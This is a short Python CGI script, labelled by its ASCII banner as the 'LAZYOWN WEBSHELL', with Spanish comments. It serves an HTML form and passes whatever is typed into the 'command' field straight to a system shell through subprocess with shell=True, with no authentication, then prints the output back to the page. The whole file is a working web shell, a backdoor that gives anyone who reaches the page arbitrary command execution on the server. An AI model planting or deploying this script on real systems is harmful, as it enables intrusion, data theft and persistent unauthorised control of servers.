#!/usr/bin/env python3

import cgi
import subprocess

BANNER = """
:::            :::     ::::::::: :::   :::  ::::::::  :::       ::: ::::    :::            
:+:          :+: :+:        :+:  :+:   :+: :+:    :+: :+:       :+: :+:+:   :+:            
+:+         +:+   +:+      +:+    +:+ +:+  +:+    +:+ +:+       +:+ :+:+:+  +:+            
+#+        +#++:++#++:    +#+      +#++:   +#+    +:+ +#+  +:+  +#+ +#+ +:+ +#+            
+#+        +#+     +#+   +#+        +#+    +#+    +#+ +#+ +#+#+ +#+ +#+  +#+#+#            
#+#        #+#     #+#  #+#         #+#    #+#    #+#  #+#+# #+#+#  #+#   #+#+#            
########## ###     ### #########    ###     ########    ###   ###   ###    ####            
:::       ::: :::::::::: :::::::::   ::::::::  :::    ::: :::::::::: :::        :::        
:+:       :+: :+:        :+:    :+: :+:    :+: :+:    :+: :+:        :+:        :+:        
+:+       +:+ +:+        +:+    +:+ +:+        +:+    +:+ +:+        +:+        +:+        
+#+  +:+  +#+ +#++:++#   +#++:++#+  +#++:++#++ +#++:++#++ +#++:++#   +#+        +#+        
+#+ +#+#+ +#+ +#+        +#+    +#+        +#+ +#+    +#+ +#+        +#+        +#+        
 #+#+# #+#+#  #+#        #+#    #+# #+#    #+# #+#    #+# #+#        #+#        #+#        
  ###   ###   ########## #########   ########  ###    ### ########## ########## ########## 

"""
# Encabezado requerido para indicar que se está devolviendo contenido HTML
print("Content-type: text/html\n")

# Obtener datos del formulario
form = cgi.FieldStorage()

# Verificar si se envió un comando
if "command" in form:
    command = form["command"].value

    # Ejecutar el comando y obtener la salida
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        output = output.decode('utf-8', errors='ignore')  # Convertir bytes a cadena
    except subprocess.CalledProcessError as e:
        output = e.output.decode('utf-8', errors='ignore')  # Capturar la salida de error

    # Mostrar la salida como respuesta HTML
    print("<html><body>")
    print("<h1>¡Resultado del comando ejecutado!</h1>")
    print("<pre>")
    print(output)
    print("</pre>")
    print("</body></html>")
else:
    # Mostrar el formulario
    print("<html><body>")
    print(f"<h6><pre>{BANNER}</pre></h6>")
    print("<form method='post'>")
    print("Comando: <input type='text' name='command'>")
    print("<input type='submit' value='Ejecutar'>")
    print("</form>")
    print("</body></html>")
